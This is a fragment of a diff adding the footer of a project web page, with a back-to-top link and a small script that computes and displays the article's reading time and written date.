+        2025 Iron Hulk: All Rights Reserved.
+        <br><br>
+        <a href="../projects.html" class="text-slate-300 text-sm px-4 py-2 rounded transition">← Back to Project</a>
+      </div>
+      <a href="#top" class="absolute right-6 top-1/2 transform -translate-y-1/2 text-slate-300 hover:text-slate-700">
+        <svg xmlns="http://www.w3.org/2000/svg" class="w-5 h-5" viewBox="0 0 20 20" fill="currentColor">
+          <path fill-rule="evenodd" d="M3.707 10.707a1 1 0 01-1.414-1.414l7-7a1 1 0 011.414 0l7 7a1 1 0 11-1.414 1.414L11 4.414V19a1 1 0 11-2 0V4.414L3.707 10.707z" clip-rule="evenodd" />
+        </svg>
+      </a>
+    </footer>
+  </main>
+  <!-- Reading-time logic -->
+  <script>
+    document.addEventListener('DOMContentLoaded', () => {
+      const dateWritten = '10/Aug/2025';
+      const words   = document.getElementById('article').innerText.trim().split(/\s+/).filter(Boolean).length;
+      const minutes = Math.max(1, Math.ceil(words / 230));
+      document.getElementById('reading-time').textContent = `Written: ${dateWritten} – ${minutes} min reading`;
+    });
+  </script>
+</body>
+</html>
